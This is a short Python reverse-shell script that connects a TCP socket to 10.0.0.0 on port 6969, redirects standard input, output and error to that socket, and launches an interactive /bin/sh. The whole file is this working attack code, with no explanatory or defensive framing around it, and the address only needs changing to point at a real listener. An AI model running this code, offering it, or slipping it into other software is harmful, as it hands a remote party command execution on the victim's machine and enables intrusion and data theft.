# -*- coding: utf-8 -*-
#!/usr/bin/env python
import socket, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.0", 6969))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.system("/bin/sh -i")
